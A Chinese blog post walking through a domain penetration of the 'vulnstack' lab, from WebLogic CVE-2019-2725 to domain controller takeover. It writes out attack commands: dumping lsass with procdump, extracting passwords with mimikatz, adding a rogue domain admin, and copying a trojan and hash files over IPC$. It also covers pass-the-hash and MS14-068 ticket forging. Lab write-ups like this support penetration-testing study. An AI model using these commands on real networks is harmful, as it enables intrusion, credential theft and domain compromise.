原创： Kale 合天智汇

前言

最近，要做一个技术沙龙，本来想分享一下安全研究的一些心得，但是好久之前想做一个域渗透的一个深入总结，但是一直搁置，借这个机会对域渗透的技巧总结一下！算是给自己一个交代:)

正文

这里用的是搭建好的一个域环境，吐槽:这个是真的大，下了好久~

地址：<http://vulnstack.qiyuanxuetang.net/vuln/detail/3/>

拓扑如下：

![v2-c65c406c73ae9b3874ab65da721312b6_hd.j](https://pic2.zhimg.com/80/v2-c65c406c73ae9b3874ab65da721312b6_hd.jpg)

环境说明

内网网段：10.10.10.1/24

DMZ网段：192.168.111.1/24

配置信息

DC

IP：10.10.10.10 OS：Windows 2012(64)

应用：AD域

WEB

IP1：10.10.10.80

IP2：192.168.111.80 OS：Windows 2008(64)

应用：Weblogic 10.3.6 MSSQL 2008

PC

IP1：10.10.10.201

IP2：192.168.111.201 OS：Windows 7(32)

信息搜集

拿到环境后，首先进行端口探测，这里使用-sS参数，由于防火墙的存在不能使用icmp包，所以使用syn包探测

![v2-c794d95822717e67aa9832d4c999dc12_hd.j](https://pic3.zhimg.com/80/v2-c794d95822717e67aa9832d4c999dc12_hd.jpg)

通过扫描端口，我们通过端口初步判断目标机存在的服务及可能存在的漏洞，如445端口开放就意味着存smb服务，存在smb服务就可能存在ms17-010/端口溢出漏洞。开放139端口，就存在Samba服务，就可能存在爆破/未授权访问/远程命令执行漏洞。开放1433端口，就存在mssql服务，可能存在爆破/注入/SA弱口令。开放3389端口，就存在远程桌面。开放7001端口就存在weblogic。

信息整理完后，我们要决定从哪条路进，这里先选择从weblogic，主要是由于weblogic的漏洞很多rce的，并且利用中间件漏洞相对于系统漏洞动静稍小些，....蓝屏什么的对吧。

![v2-c9f46f248b1034403eec4a1472ab6a4c_hd.j](https://pic1.zhimg.com/80/v2-c9f46f248b1034403eec4a1472ab6a4c_hd.jpg)

那么实际的操作是怎么样呢，小编在合天网安实验室找到了相关的实验，

Web漏洞扫描工具：

[课程:Web漏洞扫描工具(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=C9d6c0ca797abec2017041916400500001)

漏洞利用

可知WebLogic Server 版本:
10.3.6.0，这里直接使用专门扫描WebLogic漏洞的WeblogicScan来检测，除此之外还有thinkphpscan什么的。

![v2-3f060899aa25420d0e271205c3312f68_hd.j](https://pic4.zhimg.com/80/v2-3f060899aa25420d0e271205c3312f68_hd.jpg)

存在CVE-2019-2729和CVE-2019-2725

反序列化漏洞是由 wls9-async 组件 导致的，该组件默认开启，看一下是否存在该漏洞

访问 192.168.3.141:7001/_async/AsyncResponseService

![v2-962cf1b8801c3348aaa22d0933d6632a_hd.j](https://pic4.zhimg.com/80/v2-962cf1b8801c3348aaa22d0933d6632a_hd.jpg)

使用CVE-2019-2725的exp成功执行命令

![v2-ab42eb665da2dec02c30d0fc4f99b308_hd.j](https://pic4.zhimg.com/80/v2-ab42eb665da2dec02c30d0fc4f99b308_hd.jpg)

上传shell

![v2-10fc1b8f85f44c84c2a01170a6ec48b8_hd.j](https://pic3.zhimg.com/80/v2-10fc1b8f85f44c84c2a01170a6ec48b8_hd.jpg)

但是使用上面这个shell，终究不方便，我们要拿自己的shell，比如冰蝎shell或者msf shell和cs
shell，所以尝试反弹shell，使用powershell
等方式失败，接着尝试远程下载各种方式也失败。于是尝试搭建smb服务器，进行文件共享一个冰蝎shell，至于为什么用冰蝎，等下你就明白了

使用kali自带的

![v2-344d53c441a46259347523a705038e43_hd.j](https://pic3.zhimg.com/80/v2-344d53c441a46259347523a705038e43_hd.jpg)

使用网上公布的带命令回显的方式，把共享的shell复制到目标机，参考：https://github.com/lufeirider/CVE-2019-2725

![v2-76f89c38d0429c445b49c676ccf3022d_hd.j](https://pic2.zhimg.com/80/v2-76f89c38d0429c445b49c676ccf3022d_hd.jpg)

顺便吐槽一句，网上那些没搞明白的大佬不要乱发文章了
,看了别人的文章上传shell，结果一直连接不了。结果上传目录根本不是web目录，最后修改上传/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/目录才拿到shell

![v2-05454f3bed42e4b703a06900c32c31b5_hd.j](https://pic3.zhimg.com/80/v2-05454f3bed42e4b703a06900c32c31b5_hd.jpg)

拿到冰蝎shell可以和msf联动，拿到msf shell

![v2-4d2e2e8b911f9d1fd037cadea2f91b0a_hd.j](https://pic2.zhimg.com/80/v2-4d2e2e8b911f9d1fd037cadea2f91b0a_hd.jpg)

在kali打开msf设置监听

![v2-6e7500ebe1fa0ed96d599ad820e65067_hd.j](https://pic2.zhimg.com/80/v2-6e7500ebe1fa0ed96d599ad820e65067_hd.jpg)

成功拿到shell，这里说明一下，冰蝎给的msf反弹shell过时了，现在为java/meterpreter/reverse_tcp

![v2-0a9a16fbb4ceee5423b64d3a454a0811_hd.j](https://pic3.zhimg.com/80/v2-0a9a16fbb4ceee5423b64d3a454a0811_hd.jpg)

tip：如果cmd出现乱码，切换编码即可：chcp 65001

Cobaltstrike

本来并不是非要再拿一个cs
shell，但是有时候cs用着确实比msf方便，刚开始想通过注入进程，直接迁移，结果莫名失败，后来使用cs的powershell命令payload，发现不能执行。。再者就生成了一个exe，成功弹出shell

![v2-9e4a335fe185200fe3806f0671631c50_hd.j](https://pic2.zhimg.com/80/v2-9e4a335fe185200fe3806f0671631c50_hd.jpg)

![v2-844d24dff78514e4a14611510e754e3c_hd.j](https://pic2.zhimg.com/80/v2-844d24dff78514e4a14611510e754e3c_hd.jpg)

![v2-37bd216ef6ce89e53ee14d40af9fcad8_hd.j](https://pic3.zhimg.com/80/v2-37bd216ef6ce89e53ee14d40af9fcad8_hd.jpg)

运行portscan模块，扫描内网

![v2-a2e79f008e327eee739607874463bd38_hd.j](https://pic2.zhimg.com/80/v2-a2e79f008e327eee739607874463bd38_hd.jpg)

不得不说，确实比msf的友好！

顺便说一下。怎么把cs的shell转到msf

先在cs设置一个foreign的listener，然后在你想派生的shell，右键spawn，选择对应的listener

![v2-02a5c488c89bbe649090ec1895f9892a_hd.j](https://pic1.zhimg.com/80/v2-02a5c488c89bbe649090ec1895f9892a_hd.jpg)

然后再msf同时设置监听

![v2-9a5be360f6aa329ab0a17e5967af7784_hd.j](https://pic1.zhimg.com/80/v2-9a5be360f6aa329ab0a17e5967af7784_hd.jpg)

CobaltStrike高级威胁技术：

[课程:CobaltStrike高级威胁技术(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=CCID2d18-ca1f-4b83-beef-99dbeb136b22)

proxy

拿到shell，尝试进行开启socks5代理，可以使用msf的auxiliary/server/socks5模块，也可以用Regeorg +
proxychains。

将reGeorg的tunnel文件上传到肉鸡服务器到网站目录下，攻击机执行python reGeorgSocksProxy.py -p 6666 -u
http://test.com/tunnel.php。然后修改proxychains.conf 配置文件，改成socks5 127.0.0.1
6666，在使用proxychains nmap进行扫描就行了

![v2-bebfcc414928d9752c05a57daa4e6ffb_hd.j](https://pic4.zhimg.com/80/v2-bebfcc414928d9752c05a57daa4e6ffb_hd.jpg)

![v2-81b2defe752e0e71461d81ef77fcae46_hd.j](https://pic3.zhimg.com/80/v2-81b2defe752e0e71461d81ef77fcae46_hd.jpg)

![v2-fc8d98438a5faeea939b276fd4eb5673_hd.j](https://pic4.zhimg.com/80/v2-fc8d98438a5faeea939b276fd4eb5673_hd.jpg)

不过，这样用nmap的时候，有点慢，所以换了auxiliary/server/socks5模块。

首先查看并设置路由

![v2-5435cead16dc1a9bfea144e40b124e96_hd.j](https://pic2.zhimg.com/80/v2-5435cead16dc1a9bfea144e40b124e96_hd.jpg)

把10网段添加到目标机路由

![v2-922e2b1c4f65141d6608747231ad1745_hd.j](https://pic1.zhimg.com/80/v2-922e2b1c4f65141d6608747231ad1745_hd.jpg)

![v2-35ba80d8d501d7483d538b25b6137928_hd.j](https://pic4.zhimg.com/80/v2-35ba80d8d501d7483d538b25b6137928_hd.jpg)

设置好之后就使用socks5辅助模块

![v2-fb2605f9cee2c333e263413f6f10a823_hd.j](https://pic3.zhimg.com/80/v2-fb2605f9cee2c333e263413f6f10a823_hd.jpg)

然后，按照之前的方法，设置proxychains即可。

扫整个网段同样很慢，所以直接扫域控主机

![v2-4d2f749a6ee9ed3e55a3952dd21b5603_hd.j](https://pic2.zhimg.com/80/v2-4d2f749a6ee9ed3e55a3952dd21b5603_hd.jpg)

直接使用Cobalt Strike的socks代理亦可，方法类似，不再演示。

Dump hash

mimikatz

尝试读取服务器密码

直接上传mimikatz对lsass.exe进行操作很容易被杀软发现，通过使用powershell和procdump来绕过，这里powershell亦有限制，procdump为微软官方工具，所以不会被杀。所以使用procdump来先dump内存hash，保存为dmp文件，然后用mimikatz在本地破解明文hash。

procdump64.exe -accepteula -ma lsass.exe lsass.dmp

![v2-7708181c548aa73cd1f541adc3a7ac82_hd.j](https://pic3.zhimg.com/80/v2-7708181c548aa73cd1f541adc3a7ac82_hd.jpg)

然后在本地对dump下来的hash进行破解

mimikatz.exe "sekurlsa::minidump neicun.dmp" "sekurlsa::logonPasswords full"
exit

![v2-89a3ad36a534c23c6523793235500660_hd.j](https://pic2.zhimg.com/80/v2-89a3ad36a534c23c6523793235500660_hd.jpg)

![v2-f189b4d1d1dab43729c751ab558d11b6_hd.j](https://pic2.zhimg.com/80/v2-f189b4d1d1dab43729c751ab558d11b6_hd.jpg)

发现两个用户，一个Administrator，一个mssql，密码都为1qaz@WSX。

使用cs的logonpasswords功能dmup明文密码

![v2-1a3a95104a012b00280ed64961b36e71_hd.j](https://pic4.zhimg.com/80/v2-1a3a95104a012b00280ed64961b36e71_hd.jpg)

![v2-fd8a5648738a85ffddb3c77bfbde093f_hd.j](https://pic3.zhimg.com/80/v2-fd8a5648738a85ffddb3c77bfbde093f_hd.jpg)

LaZagne

这里再介绍LaZagne一个收集密码工具-LaZagne，每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码，这个工具是用来获取存储在本地计算机上的密码，诸如浏览器密码等等

工具地址：<https://github.com/AlessandroZ/LaZagne>

![v2-34c47cadaa99fc14692a320ee699d806_hd.j](https://pic3.zhimg.com/80/v2-34c47cadaa99fc14692a320ee699d806_hd.jpg)

![v2-72fcb994ab68c776c42aa909d170d111_hd.j](https://pic1.zhimg.com/80/v2-72fcb994ab68c776c42aa909d170d111_hd.jpg)

横向移动-pth攻击

pass-the-hash在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM
Hash访问远程主机或服务，而不用提供明文密码。

这类攻击适用于：

  * 域/工作组环境  

  * 可以获得hash,但是条件不允许对hash爆破  

  * 内网中存在和当前机器相同的密码  

微软也对pth打过补丁(KB22871997)，然而，在测试中发现，在打了补丁之后，常规的Pass The Hash已经无法成功，唯独默认的
Administrator (SID 500)账号例外，利用这个账号仍可以进行Pass The
Hash远程连接。如果禁用了ntlm认证，psexec无法利用获得的ntlm hash进行远程连接,但是使用mimi还是可以攻击成功的。

首先经过查看发现主机并没打KB22871997(拿到权限后查看)，所以普通用户也可进行pth攻击，对域控进行攻击，这个用户必须是域控主机上的用户，我们需要一个用户名和对应的hash。之前从拿下的主机中有个de1ay的用户

![v2-2c88aea7a87281e2cb0d5245a0324e0f_hd.j](https://pic4.zhimg.com/80/v2-2c88aea7a87281e2cb0d5245a0324e0f_hd.jpg)

由于用其它方法均失败了，所以直接使用cs的pth模块进行尝试

![v2-62944c9218260d55939573f0c6c0f082_hd.j](https://pic1.zhimg.com/80/v2-62944c9218260d55939573f0c6c0f082_hd.jpg)

进行之前查看能不能访问域控资源

![v2-4ae3ec71a75ddabf56a909ee70effeef_hd.j](https://pic2.zhimg.com/80/v2-4ae3ec71a75ddabf56a909ee70effeef_hd.jpg)

在cs里面右键session，选择Access->make token

![v2-0ef81b99dd92d6f95a9c02015efd0990_hd.j](https://pic4.zhimg.com/80/v2-0ef81b99dd92d6f95a9c02015efd0990_hd.jpg)

再次访问域控资源，发现成功

![v2-fd11800229c47e13971b8f5752535bc4_hd.j](https://pic2.zhimg.com/80/v2-fd11800229c47e13971b8f5752535bc4_hd.jpg)

尝试添加域控管理员，这里是添加hacker用户，两次截图的结果有点不一致，之前忘截了一张补了个新用户

net group "Domain admins" hacker /add /domainnet user hacker 123456@abc /add
/doamin

![v2-3740cf0d30b82f2af483b07623a8fda3_hd.j](https://pic3.zhimg.com/80/v2-3740cf0d30b82f2af483b07623a8fda3_hd.jpg)

![v2-ec11***7ff9a36903e1fe45e52e381ca_hd.j](https://pic4.zhimg.com/80/v2-ec11***7ff9a36903e1fe45e52e381ca_hd.jpg)

建立IPC$连接上传木马
建立后可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令。上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。

常用命令

net use \\\ip\ipc$ pawword /user:username 建立IPC连接 copy hacker.exe
\\\10.10.10.10\C$\windows\temp 复制本地文件到目标服务器copy
\\\10.10.10.10\C$\windows\temp\hash.txt 复制目标服务器文件到本地

![v2-7f9bd964b55a23dbe18e43247cd5adcd_hd.j](https://pic1.zhimg.com/80/v2-7f9bd964b55a23dbe18e43247cd5adcd_hd.jpg)

然后用msf生成一个木马用copy命令上传，不用cs的原因是cs的路由问题真是搞不懂~路由添加失败，所以用msf添加路由进行监听弹shellcopy
hacker.exe \\\host\c$\windows\temp\foobar.exe ##IPC拷贝木马文件

![v2-85fe921b9d2f5ce77c39e29f451626dc_hd.j](https://pic1.zhimg.com/80/v2-85fe921b9d2f5ce77c39e29f451626dc_hd.jpg)

然后wmic命令执行木马

![v2-532c9469c518243b6ba0a87f865d1961_hd.j](https://pic3.zhimg.com/80/v2-532c9469c518243b6ba0a87f865d1961_hd.jpg)

msf设置监听，收到shell

先添加路由

![v2-909c58bd46f57578e50508e91b10af4d_hd.j](https://pic4.zhimg.com/80/v2-909c58bd46f57578e50508e91b10af4d_hd.jpg)

成功拿到域控的shell

![v2-fa1e2f0601822902e330a65cacc21b8a_hd.j](https://pic4.zhimg.com/80/v2-fa1e2f0601822902e330a65cacc21b8a_hd.jpg)

横向移动-ptt

ptt攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，三种常见的攻击方法：MS14-068,Golden
ticket,SILVER TICKET.

简要介绍一下Kerberos协议具体工作方法：

  * 客户机将明文密码进行ntlm哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控）,kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)  

  * 将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据  

  * 然后客户机将tgt发送给域控制器KDC请求TGS（票证授权服务）票证，并且对tgt进行检测  

  * 检测成功之后，将目标服务账户的ntlm以及tgt进行加密，将加密后的结果返回给客户机。ms14-068  

MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos
TGT来获得票证.

利用过程

1.whoami/user 得到普通域用户的sid

![v2-dfb8f573b9f2fbfcb9088873c242235e_hd.j](https://pic4.zhimg.com/80/v2-dfb8f573b9f2fbfcb9088873c242235e_hd.jpg)

2.使用 pykek 生成票据，用 proxychains 把 pykek 带入内网

![v2-4de5017716862f53243a301d18f158c5_hd.j](https://pic2.zhimg.com/80/v2-4de5017716862f53243a301d18f158c5_hd.jpg)

3.第三步不是必要，使用上面的生成的即可进行凭据注入，但是转换成kirbi 格式可以进行更多操作。使用使用 KrbCredExport进行转换

![v2-55980d1302c20fc461beab901491e809_hd.j](https://pic3.zhimg.com/80/v2-55980d1302c20fc461beab901491e809_hd.jpg)

4.使用cs进行凭据注入

清除凭证

kerberos_ticket_purge

使用kerberos_ticket_use进行凭据注入

![v2-edef300369b1bbc1c3d85d894f8cd6d2_hd.j](https://pic1.zhimg.com/80/v2-edef300369b1bbc1c3d85d894f8cd6d2_hd.jpg)

成功访问域控资源，接下来的操作和上面相同，利用$ipc拿shell即可

写在最后

拿到域控后，就可以做很多事情了，不再继续了，比如：制作黄金票据，导出域hash等等。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关!

  

